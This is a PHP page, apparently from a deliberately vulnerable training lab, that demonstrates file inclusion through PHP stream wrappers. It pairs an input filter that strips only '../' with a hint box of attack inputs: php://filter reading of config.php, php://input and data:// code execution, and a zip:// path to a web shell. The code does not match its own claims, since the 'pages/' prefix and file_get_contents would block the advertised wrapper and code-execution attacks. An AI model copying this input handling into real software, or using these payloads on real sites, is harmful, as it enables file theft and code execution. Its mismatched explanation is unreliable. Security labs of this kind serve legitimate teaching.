<?php
// PHP伪协议文件包含
$output = null;
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    // 过滤了 ../ 但未过滤伪协议
    $page = str_replace('../', '', $page);
    $file = "pages/" . $page;
    $content = @file_get_contents($file);
    if ($content !== false) {
        $output = $content;
    } else {
        $output = "无法读取文件";
    }
}
?>

<p>页面加载（PHP伪协议包含）</p>
<p>过滤了 ../ 但可使用PHP伪协议读取文件或执行代码。</p>

<form method="GET">
    <input type="hidden" name="id" value="<?= h($_GET['id'] ?? '') ?>">
    <label>页面路径</label>
    <input type="text" name="page" placeholder="例如：home" value="<?= h($_GET['page'] ?? '') ?>">
    <button type="submit" class="btn btn-primary">加 载</button>
</form>

<?php if ($output): ?>
    <div class="result-box"><pre><?= h($output) ?></pre></div>
<?php endif; ?>

<div style="margin-top:1rem; padding:1rem; background:var(--bg-secondary); border-radius:var(--radius-sm); font-size:0.8rem;">
    <strong style="color:var(--warning);">PHP伪协议：</strong>
    <br>?page=php://filter/convert.base64-encode/resource=config.php
    <br>?page=php://input （POST数据作为代码执行）
    <br>?page=data://text/plain,&lt;?php phpinfo();?&gt;
    <br>?page=zip://shell.jpg%23shell.php
</div>
